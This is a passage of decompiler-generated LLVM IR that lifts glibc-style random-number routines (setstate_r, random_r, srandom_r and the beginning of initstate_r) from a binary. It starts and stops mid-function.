  %stack_var_-40 = alloca i32, align 4
  %v2_1000b738 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000b738, i32* @r3, align 4
  %v0_1000b754 = call i32 @__pthread_return_void()
  %v0_1000b75c = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_100248f8 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268482416, i32* @lr, align 4
  %v0_1000b76c = call i32 @srandom_r()
  store i32 %v2_1000b738, i32* @r3, align 4
  %v0_1000b778 = call i32 @__pthread_return_void()
  ret i32 %v0_1000b778

; uselistorder directives
  uselistorder i32* @global_var_100248f8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100248f8 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1000b790 = add i32 %tmp, 12
  %v2_1000b790 = inttoptr i32 %v1_1000b790 to i32*
  %v3_1000b790 = load i32, i32* %v2_1000b790, align 4
  store i32 %v3_1000b790, i32* %r11.global-to-local, align 4
  %v0_1000b794 = load i32, i32* @lr, align 4
  store i32 %v0_1000b794, i32* %r0.global-to-local, align 4
  %v1_1000b79c = add i32 %arg1, 4
  store i32 %v1_1000b79c, i32* %r3.global-to-local, align 4
  %v3_1000b7a0 = icmp eq i32 %v3_1000b790, 0
  %v1_1000b7a4 = add i32 %tmp, 8
  %v2_1000b7a4 = inttoptr i32 %v1_1000b7a4 to i32*
  %v3_1000b7a4 = load i32, i32* %v2_1000b7a4, align 4
  store i32 %v3_1000b7a4, i32* %r9.global-to-local, align 4
  br i1 %v3_1000b7a0, label %dec_label_pc_1000b7b0, label %dec_label_pc_1000b7b8

dec_label_pc_1000b7b0:                            ; preds = %entry
  %v2_1000b7b0 = add i32 %v3_1000b7a4, -4
  %v3_1000b7b0 = inttoptr i32 %v2_1000b7b0 to i32*
  store i32 0, i32* %v3_1000b7b0, align 4
  br label %dec_label_pc_1000b7d0

dec_label_pc_1000b7b8:                            ; preds = %entry
  %v1_1000b7b8 = add i32 %tmp, 4
  %v2_1000b7b8 = inttoptr i32 %v1_1000b7b8 to i32*
  %v3_1000b7b8 = load i32, i32* %v2_1000b7b8, align 4
  %v2_1000b7bc = sub i32 %v3_1000b7b8, %v3_1000b7a4
  %v4_1000b7c0 = sdiv i32 %v2_1000b7bc, 4
  %v1_1000b7c4 = mul i32 %v4_1000b7c0, 5
  %v2_1000b7c8 = add i32 %v1_1000b7c4, %v3_1000b790
  store i32 %v2_1000b7c8, i32* %r0.global-to-local, align 4
  %v2_1000b7cc = add i32 %v3_1000b7a4, -4
  %v3_1000b7cc = inttoptr i32 %v2_1000b7cc to i32*
  store i32 %v2_1000b7c8, i32* %v3_1000b7cc, align 4
  br label %dec_label_pc_1000b7d0

dec_label_pc_1000b7d0:                            ; preds = %dec_label_pc_1000b7b0, %dec_label_pc_1000b7b8
  %v0_1000b7d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b7d0 = add i32 %v0_1000b7d0, -4
  %v2_1000b7d0 = inttoptr i32 %v1_1000b7d0 to i32*
  %v3_1000b7d0 = load i32, i32* %v2_1000b7d0, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10013534.627 to i32), i32* %r9.global-to-local, align 4
  %v2_1000b7e0 = srem i32 %v3_1000b7d0, 5
  store i32 %v2_1000b7e0, i32* %r11.global-to-local, align 4
  %v2_1000b7f0 = icmp ugt i32 %v2_1000b7e0, 4
  %v1_1000b7f4 = mul nsw i32 %v2_1000b7e0, 4
  store i32 %v1_1000b7f4, i32* %r0.global-to-local, align 4
  %v2_1000b7fc = add i32 %v1_1000b7f4, ptrtoint (i32* @global_var_10013534.627 to i32)
  store i32 %v2_1000b7fc, i32* %r10.global-to-local, align 4
  br i1 %v2_1000b7f0, label %dec_label_pc_1000b860, label %dec_label_pc_1000b804

dec_label_pc_1000b804:                            ; preds = %dec_label_pc_1000b7d0
  %v3_1000b7f8 = icmp eq i32 %v2_1000b7e0, 0
  %v1_1000b804 = add i32 %v1_1000b7f4, add (i32 ptrtoint (i32* @global_var_10013534.627 to i32), i32 20)
  %v2_1000b804 = inttoptr i32 %v1_1000b804 to i32*
  %v3_1000b804 = load i32, i32* %v2_1000b804, align 4
  store i32 %v3_1000b804, i32* %r10.global-to-local, align 4
  %v3_1000b808 = inttoptr i32 %v2_1000b7fc to i32*
  %v4_1000b808 = load i32, i32* %v3_1000b808, align 4
  store i32 %v4_1000b808, i32* %r9.global-to-local, align 4
  %v1_1000b80c = mul i32 %v3_1000b804, 4
  store i32 %v1_1000b80c, i32* %r0.global-to-local, align 4
  %v2_1000b810 = add i32 %tmp, 16
  %v3_1000b810 = inttoptr i32 %v2_1000b810 to i32*
  store i32 %v3_1000b804, i32* %v3_1000b810, align 4
  %v0_1000b814 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b814 = add i32 %tmp, 20
  %v3_1000b814 = inttoptr i32 %v2_1000b814 to i32*
  store i32 %v0_1000b814, i32* %v3_1000b814, align 4
  %v0_1000b818 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b818 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000b818 = add i32 %v1_1000b818, %v0_1000b818
  store i32 %v2_1000b818, i32* %r8.global-to-local, align 4
  %v0_1000b81c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000b81c, i32* %v2_1000b790, align 4
  br i1 %v3_1000b7f8, label %dec_label_pc_1000b854, label %dec_label_pc_1000b824

dec_label_pc_1000b824:                            ; preds = %dec_label_pc_1000b804
  %v0_1000b824 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b824 = add i32 %v0_1000b824, -4
  %v2_1000b824 = inttoptr i32 %v1_1000b824 to i32*
  %v3_1000b824 = load i32, i32* %v2_1000b824, align 4
  %v1_1000b828 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000b828 = sdiv i32 %v3_1000b824, %v1_1000b828
  %v1_1000b82c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b82c = add i32 %v1_1000b82c, %v2_1000b828
  store i32 %v2_1000b82c, i32* %r9.global-to-local, align 4
  %v1_1000b830 = mul i32 %v2_1000b828, 4
  %v1_1000b834 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b834 = sdiv i32 %v2_1000b82c, %v1_1000b834
  store i32 %v2_1000b834, i32* %r11.global-to-local, align 4
  %v2_1000b838 = add i32 %v1_1000b830, %v0_1000b824
  store i32 %v2_1000b838, i32* %r0.global-to-local, align 4
  %v2_1000b83c = add i32 %tmp, 4
  %v3_1000b83c = inttoptr i32 %v2_1000b83c to i32*
  store i32 %v2_1000b838, i32* %v3_1000b83c, align 4
  %v0_1000b840 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b840 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b840 = mul i32 %v1_1000b840, %v0_1000b840
  store i32 %v2_1000b840, i32* %r11.global-to-local, align 4
  %v1_1000b844 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b844 = sub i32 %v1_1000b844, %v2_1000b840
  %v1_1000b848 = mul i32 %v2_1000b844, 4
  %v0_1000b84c = load i32, i32* %r3.global-to-local, align 4
  %v2_1000b84c = add i32 %v1_1000b848, %v0_1000b84c
  store i32 %v2_1000b84c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000b84c, i32* %arg2, align 4
  br label %dec_label_pc_1000b854

dec_label_pc_1000b854:                            ; preds = %dec_label_pc_1000b804, %dec_label_pc_1000b824
  %v0_1000b854 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000b854 = add i32 %tmp, 24
  %v3_1000b854 = inttoptr i32 %v2_1000b854 to i32*
  store i32 %v0_1000b854, i32* %v3_1000b854, align 4
  %v0_1000b858 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1000b858, i32* %v2_1000b7a4, align 4
  %v0_1000b874.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000b870

dec_label_pc_1000b860:                            ; preds = %dec_label_pc_1000b7d0
  %v0_1000b860 = call i32 @__errno_location()
  store i32 %v0_1000b860, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000b868 = inttoptr i32 %v0_1000b860 to i32*
  store i32 22, i32* %v2_1000b868, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000b870

dec_label_pc_1000b870:                            ; preds = %dec_label_pc_1000b854, %dec_label_pc_1000b860
  %v0_1000b874 = phi i32 [ %v0_1000b874.pre, %dec_label_pc_1000b854 ], [ -1, %dec_label_pc_1000b860 ]
  store i32 %v0_1000b794, i32* %r0.global-to-local, align 4
  store i32 %v0_1000b874, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b874

; uselistorder directives
  uselistorder i32 %v0_1000b874, { 1, 0 }
  uselistorder i32 %v3_1000b804, { 1, 0, 2 }
  uselistorder i32 %v1_1000b7f4, { 2, 1, 0 }
  uselistorder i32 %v2_1000b7e0, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 4, 6, 3, 5, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_1000b870, { 1, 0 }
  uselistorder label %dec_label_pc_1000b854, { 1, 0 }
  uselistorder label %dec_label_pc_1000b7d0, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1000b884 = add i32 %tmp, 12
  %v2_1000b884 = inttoptr i32 %v1_1000b884 to i32*
  %v3_1000b884 = load i32, i32* %v2_1000b884, align 4
  %v1_1000b890 = add i32 %tmp, 8
  %v2_1000b890 = inttoptr i32 %v1_1000b890 to i32*
  %v3_1000b890 = load i32, i32* %v2_1000b890, align 4
  store i32 %v3_1000b890, i32* %r7.global-to-local, align 4
  %v3_1000b894 = icmp eq i32 %v3_1000b884, 0
  br i1 %v3_1000b894, label %dec_label_pc_1000b89c, label %dec_label_pc_1000b8b8

dec_label_pc_1000b89c:                            ; preds = %entry
  %v1_1000b89c = inttoptr i32 %v3_1000b890 to i32*
  %v2_1000b89c = load i32, i32* %v1_1000b89c, align 4
  %v2_1000b8a0 = mul i32 %v2_1000b89c, 1103515245
  %v1_1000b8a4 = add i32 %v2_1000b8a0, 12345
  %v1_1000b8a8 = urem i32 %v1_1000b8a4, -2147483648
  store i32 %v1_1000b8a8, i32* %r9.global-to-local, align 4
  store i32 %v1_1000b8a8, i32* %v1_1000b89c, align 4
  %v0_1000b8b0 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b8b0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000b8b0, i32* %v2_1000b8b0, align 4
  br label %dec_label_pc_1000b90c

dec_label_pc_1000b8b8:                            ; preds = %entry
  %v2_1000b8b8 = load i32, i32* %arg1, align 4
  %v1_1000b8bc = add i32 %tmp, 4
  %v2_1000b8bc = inttoptr i32 %v1_1000b8bc to i32*
  %v3_1000b8bc = load i32, i32* %v2_1000b8bc, align 4
  store i32 %v3_1000b8bc, i32* %r9.global-to-local, align 4
  %v1_1000b8c0 = add i32 %tmp, 24
  %v2_1000b8c0 = inttoptr i32 %v1_1000b8c0 to i32*
  %v3_1000b8c0 = load i32, i32* %v2_1000b8c0, align 4
  %v1_1000b8c4 = add i32 %v2_1000b8b8, 4
  store i32 %v1_1000b8c4, i32* @r8, align 4
  %v1_1000b8c8 = add i32 %v3_1000b8bc, 4
  %v1_1000b8cc = inttoptr i32 %v3_1000b8bc to i32*
  %v2_1000b8cc = load i32, i32* %v1_1000b8cc, align 4
  store i32 %v2_1000b8cc, i32* %r9.global-to-local, align 4
  %v2_1000b8d0 = icmp ult i32 %v1_1000b8c4, %v3_1000b8c0
  %v1_1000b8d8 = inttoptr i32 %v2_1000b8b8 to i32*
  %v2_1000b8d8 = load i32, i32* %v1_1000b8d8, align 4
  store i32 %v1_1000b8c8, i32* %r10.global-to-local, align 4
  %v2_1000b8e0 = add i32 %v2_1000b8d8, %v2_1000b8cc
  %v1_1000b8e4 = udiv i32 %v2_1000b8e0, 2
  store i32 %v1_1000b8e4, i32* %r9.global-to-local, align 4
  store i32 %v2_1000b8e0, i32* %v1_1000b8d8, align 4
  %v0_1000b8ec = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b8ec = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000b8ec, i32* %v2_1000b8ec, align 4
  br i1 %v2_1000b8d0, label %dec_label_pc_1000b8fc, label %dec_label_pc_1000b8f4

dec_label_pc_1000b8f4:                            ; preds = %dec_label_pc_1000b8b8
  %v0_1000b8f4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000b8f4, i32* @r8, align 4
  br label %dec_label_pc_1000b904

dec_label_pc_1000b8fc:                            ; preds = %dec_label_pc_1000b8b8
  %v2_1000b8d4 = icmp ult i32 %v1_1000b8c8, %v3_1000b8c0
  br i1 %v2_1000b8d4, label %dec_label_pc_1000b904, label %dec_label_pc_1000b900

dec_label_pc_1000b900:                            ; preds = %dec_label_pc_1000b8fc
  %v0_1000b900 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000b900, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b904

dec_label_pc_1000b904:                            ; preds = %dec_label_pc_1000b8fc, %dec_label_pc_1000b8f4, %dec_label_pc_1000b900
  %v0_1000b904 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000b904, i32* %v2_1000b8bc, align 4
  %v0_1000b908 = load i32, i32* @r8, align 4
  store i32 %v0_1000b908, i32* %arg1, align 4
  br label %dec_label_pc_1000b90c

dec_label_pc_1000b90c:                            ; preds = %dec_label_pc_1000b89c, %dec_label_pc_1000b904
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000b8e0, { 1, 0 }
  uselistorder i32 %v1_1000b8c8, { 1, 0 }
  uselistorder i32 %v3_1000b8bc, { 1, 0, 2 }
  uselistorder i32 %v1_1000b8a8, { 1, 0 }
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b90c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b904, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000b914 = load i32, i32* @lr, align 4
  %v0_1000b920 = load i32, i32* @r4, align 4
  store i32 %v0_1000b920, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1000b92c = add i32 %v0_1000b920, 12
  %v2_1000b92c = inttoptr i32 %v1_1000b92c to i32*
  %v3_1000b92c = load i32, i32* %v2_1000b92c, align 4
  %v2_1000b930 = icmp ugt i32 %v3_1000b92c, 4
  br i1 %v2_1000b930, label %dec_label_pc_1000b9e0, label %dec_label_pc_1000b938

dec_label_pc_1000b938:                            ; preds = %entry
  %v0_1000b938 = load i32, i32* @r3, align 4
  %v3_1000b938 = icmp eq i32 %v0_1000b938, 0
  %v1_1000b93c = add i32 %v0_1000b920, 8
  %v2_1000b93c = inttoptr i32 %v1_1000b93c to i32*
  %v3_1000b93c = load i32, i32* %v2_1000b93c, align 4
  store i32 %v3_1000b93c, i32* %r10.global-to-local, align 4
  br i1 %v3_1000b938, label %dec_label_pc_1000b944, label %dec_label_pc_1000b948

dec_label_pc_1000b944:                            ; preds = %dec_label_pc_1000b938
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_1000b948

dec_label_pc_1000b948:                            ; preds = %dec_label_pc_1000b938, %dec_label_pc_1000b944
  %v0_1000b94c = phi i32 [ %v0_1000b938, %dec_label_pc_1000b938 ], [ 1, %dec_label_pc_1000b944 ]
  %v3_1000b948 = icmp eq i32 %v3_1000b92c, 0
  %v2_1000b94c = inttoptr i32 %v3_1000b93c to i32*
  store i32 %v0_1000b94c, i32* %v2_1000b94c, align 4
  br i1 %v3_1000b948, label %dec_label_pc_1000b9dc, label %dec_label_pc_1000b954

dec_label_pc_1000b954:                            ; preds = %dec_label_pc_1000b948
  %v0_1000b954 = load i32, i32* @r30, align 4
  %v1_1000b954 = add i32 %v0_1000b954, 16
  %v2_1000b954 = inttoptr i32 %v1_1000b954 to i32*
  %v3_1000b954 = load i32, i32* %v2_1000b954, align 4
  store i32 %v3_1000b954, i32* %r11.global-to-local, align 4
  store i32 127773, i32* @r8, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_1000b96c = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_1000b954, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_1000b954, 0
  br i1 %tmp18, label %dec_label_pc_1000b9a8.preheader, label %dec_label_pc_1000b9a8.preheader.thread

dec_label_pc_1000b9a8.preheader.thread:           ; preds = %dec_label_pc_1000b954
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000b9ac

dec_label_pc_1000b9a8.preheader:                  ; preds = %dec_label_pc_1000b954
  %v1_1000b9a82 = add i32 %v3_1000b954, -1
  store i32 %v1_1000b9a82, i32* %ctr.global-to-local, align 4
  %v2_1000b9a83 = icmp eq i32 %v1_1000b9a82, 0
  br i1 %v2_1000b9a83, label %dec_label_pc_1000b9ac, label %dec_label_pc_1000b984

dec_label_pc_1000b984:                            ; preds = %dec_label_pc_1000b9a8.preheader, %dec_label_pc_1000b9a4.dec_label_pc_1000b984_crit_edge
  %v1_1000b9a4 = phi i32 [ %v2_1000b9a4, %dec_label_pc_1000b9a4.dec_label_pc_1000b984_crit_edge ], [ %v0_1000b96c, %dec_label_pc_1000b9a8.preheader ]
  %v1_1000b984 = phi i32 [ %v1_1000b984.pre, %dec_label_pc_1000b9a4.dec_label_pc_1000b984_crit_edge ], [ 127773, %dec_label_pc_1000b9a8.preheader ]
  %v0_1000b984 = load i32, i32* @r3, align 4
  %v2_1000b984 = sdiv i32 %v0_1000b984, %v1_1000b984
  %v2_1000b988 = mul i32 %v2_1000b984, %v1_1000b984
  %v2_1000b98c = sub i32 %v0_1000b984, %v2_1000b988
  %v1_1000b990 = mul i32 %v2_1000b984, 2836
  store i32 %v1_1000b990, i32* %r0.global-to-local, align 4
  %v1_1000b994 = mul i32 %v2_1000b98c, 16807
  %v2_1000b998 = sub i32 %v1_1000b994, %v1_1000b990
  store i32 %v2_1000b998, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_1000b998, -1
  br i1 %tmp19, label %dec_label_pc_1000b9a4, label %dec_label_pc_1000b9a0

dec_label_pc_1000b9a0:                            ; preds = %dec_label_pc_1000b984
  %v1_1000b9a0 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000b9a0 = add i32 %v1_1000b9a0, %v2_1000b998
  store i32 %v2_1000b9a0, i32* @r3, align 4
  br label %dec_label_pc_1000b9a4

dec_label_pc_1000b9a4:                            ; preds = %dec_label_pc_1000b984, %dec_label_pc_1000b9a0
  %v0_1000b9a4 = phi i32 [ %v2_1000b998, %dec_label_pc_1000b984 ], [ %v2_1000b9a0, %dec_label_pc_1000b9a0 ]
  %v2_1000b9a4 = add i32 %v1_1000b9a4, 4
  %v3_1000b9a4 = inttoptr i32 %v2_1000b9a4 to i32*
  store i32 %v0_1000b9a4, i32* %v3_1000b9a4, align 4
  %v0_1000b9a8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b9a8 = add i32 %v0_1000b9a8, -1
  store i32 %v1_1000b9a8, i32* %ctr.global-to-local, align 4
  %v2_1000b9a8 = icmp eq i32 %v1_1000b9a8, 0
  br i1 %v2_1000b9a8, label %dec_label_pc_1000b9a8.dec_label_pc_1000b9ac_crit_edge, label %dec_label_pc_1000b9a4.dec_label_pc_1000b984_crit_edge

dec_label_pc_1000b9a4.dec_label_pc_1000b984_crit_edge: ; preds = %dec_label_pc_1000b9a4
  %v1_1000b984.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000b984

dec_label_pc_1000b9a8.dec_label_pc_1000b9ac_crit_edge: ; preds = %dec_label_pc_1000b9a4
  %v0_1000b9ac.pre = load i32, i32* @r30, align 4
  %v0_1000b9b0.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000b9b4.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b9ac

dec_label_pc_1000b9ac:                            ; preds = %dec_label_pc_1000b9a8.preheader.thread, %dec_label_pc_1000b9a8.dec_label_pc_1000b9ac_crit_edge, %dec_label_pc_1000b9a8.preheader
  %v0_1000b9b4 = phi i32 [ %v0_1000b9b4.pre, %dec_label_pc_1000b9a8.dec_label_pc_1000b9ac_crit_edge ], [ %v0_1000b96c, %dec_label_pc_1000b9a8.preheader ], [ %v0_1000b96c, %dec_label_pc_1000b9a8.preheader.thread ]
  %v0_1000b9b0 = phi i32 [ %v0_1000b9b0.pre, %dec_label_pc_1000b9a8.dec_label_pc_1000b9ac_crit_edge ], [ %v3_1000b954, %dec_label_pc_1000b9a8.preheader ], [ %v3_1000b954, %dec_label_pc_1000b9a8.preheader.thread ]
  %v1_1000b9b4 = phi i32 [ %v0_1000b9ac.pre, %dec_label_pc_1000b9a8.dec_label_pc_1000b9ac_crit_edge ], [ %v0_1000b954, %dec_label_pc_1000b9a8.preheader ], [ %v0_1000b954, %dec_label_pc_1000b9a8.preheader.thread ]
  %v1_1000b9ac = add i32 %v1_1000b9b4, 20
  %v2_1000b9ac = inttoptr i32 %v1_1000b9ac to i32*
  %v3_1000b9ac = load i32, i32* %v2_1000b9ac, align 4
  store i32 %v3_1000b9ac, i32* %r0.global-to-local, align 4
  %v1_1000b9b0 = mul i32 %v0_1000b9b0, 10
  store i32 %v1_1000b9b0, i32* %r31.global-to-local, align 4
  %v2_1000b9b4 = add i32 %v1_1000b9b4, 4
  %v3_1000b9b4 = inttoptr i32 %v2_1000b9b4 to i32*
  store i32 %v0_1000b9b4, i32* %v3_1000b9b4, align 4
  %v0_1000b9b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b9b8 = mul i32 %v0_1000b9b8, 4
  %v0_1000b9bc = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b9bc = add i32 %v0_1000b9bc, %v1_1000b9b8
  store i32 %v2_1000b9bc, i32* %r0.global-to-local, align 4
  %v1_1000b9c0 = load i32, i32* @r30, align 4
  %v2_1000b9c0 = inttoptr i32 %v1_1000b9c0 to i32*
  store i32 %v2_1000b9bc, i32* %v2_1000b9c0, align 4
  %v2_1000b9d4 = ptrtoint i32* %stack_var_-24 to i32
  %v0_1000b9cc21 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b9cc22 = add i32 %v0_1000b9cc21, -1
  store i32 %v1_1000b9cc22, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_1000b9cc22, -1
  br i1 %tmp2025, label %dec_label_pc_1000b9c8, label %dec_label_pc_1000b9dc

dec_label_pc_1000b9c8:                            ; preds = %dec_label_pc_1000b9ac, %dec_label_pc_1000b9c8
  %v0_1000b9d026 = load i32, i32* @r30, align 4
  %v2_1000b9c8 = inttoptr i32 %v0_1000b9d026 to i32*
  %v3_1000b9c8 = call i32 @__GI_random_r(i32* %v2_1000b9c8, i32 %v2_1000b9d4)
  %v0_1000b9cc = load i32, i32* @r31, align 4
  %v1_1000b9cc = add i32 %v0_1000b9cc, -1
  store i32 %v1_1000b9cc, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_1000b9cc, -1
  br i1 %tmp20, label %dec_label_pc_1000b9c8, label %dec_label_pc_1000b9dc

dec_label_pc_1000b9dc:                            ; preds = %dec_label_pc_1000b9ac, %dec_label_pc_1000b9c8, %dec_label_pc_1000b948
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b9e0

dec_label_pc_1000b9e0:                            ; preds = %entry, %dec_label_pc_1000b9dc
  %v0_1000b9e0 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_1000b9dc ]
  store i32 %v0_1000b914, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000b9e0

; uselistorder directives
  uselistorder i32 %v1_1000b9a8, { 1, 0 }
  uselistorder i32 %v2_1000b9a4, { 1, 0 }
  uselistorder i32 %v2_1000b998, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000b984, { 1, 0 }
  uselistorder i32 %v0_1000b96c, { 1, 2, 0 }
  uselistorder i32 %v3_1000b954, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_1000b9e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b9c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9ac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000b9a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b984, { 1, 0 }
  uselistorder label %dec_label_pc_1000b948, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000b9f8 = icmp ugt i32 %arg2, 127
  %v0_1000ba00 = load i32, i32* @lr, align 4
  store i32 %v0_1000ba00, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  %v1_1000ba0c = sub i32 255, %arg2
  %v2_1000ba0c = sub i32 -1, %arg2
  %not.v5_1000ba0c = icmp ugt i32 %v1_1000ba0c, %v2_1000ba0c
  %v6_1000ba10 = sext i1 %not.v5_1000ba0c to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_1000ba18 = add i32 %tmp, 4
  store i32 %v1_1000ba18, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10013534.627 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_1000ba30 = sub nsw i32 3, %v6_1000ba10
  store i32 %v1_1000ba30, i32* @r31, align 4
  br i1 %v2_1000b9f8, label %dec_label_pc_1000ba58, label %dec_label_pc_1000ba38

dec_label_pc_1000ba38:                            ; preds = %entry
  %v2_1000ba24 = icmp ugt i32 %arg2, 31
  %v1_1000ba38 = sub i32 63, %arg2
  %not.v5_1000ba38 = icmp ugt i32 %v1_1000ba38, %v2_1000ba0c
  %v6_1000ba3c = sext i1 %not.v5_1000ba38 to i32
  %v1_1000ba44 = sub nsw i32 1, %v6_1000ba3c
  store i32 %v1_1000ba44, i32* @r31, align 4
  br i1 %v2_1000ba24, label %dec_label_pc_1000ba58, label %dec_label_pc_1000ba4c

dec_label_pc_1000ba4c:                            ; preds = %dec_label_pc_1000ba38
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_1000bab8, label %dec_label_pc_1000ba58

dec_label_pc_1000ba58:                            ; preds = %dec_label_pc_1000ba4c, %dec_label_pc_1000ba38, %entry
  %v0_1000ba58 = phi i32 [ 0, %dec_label_pc_1000ba4c ], [ %v1_1000ba44, %dec_label_pc_1000ba38 ], [ %v1_1000ba30, %entry ]
  %v1_1000ba58 = mul nsw i32 %v0_1000ba58, 4
  store i32 %v1_1000ba58, i32* %r0.global-to-local, align 4
  %v2_1000ba5c = add i32 %arg3, 12
  %v3_1000ba5c = inttoptr i32 %v2_1000ba5c to i32*
  store i32 %v0_1000ba58, i32* %v3_1000ba5c, align 4
  %v0_1000ba60 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ba60 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000ba60 = add i32 %v1_1000ba60, %v0_1000ba60
  store i32 %v2_1000ba60, i32* %r9.global-to-local, align 4
  %v3_1000ba64 = inttoptr i32 %v2_1000ba60 to i32*
  %v4_1000ba64 = load i32, i32* %v3_1000ba64, align 4
  store i32 %v4_1000ba64, i32* %r0.global-to-local, align 4
  %v1_1000ba68 = add i32 %v2_1000ba60, 20
  %v2_1000ba68 = inttoptr i32 %v1_1000ba68 to i32*
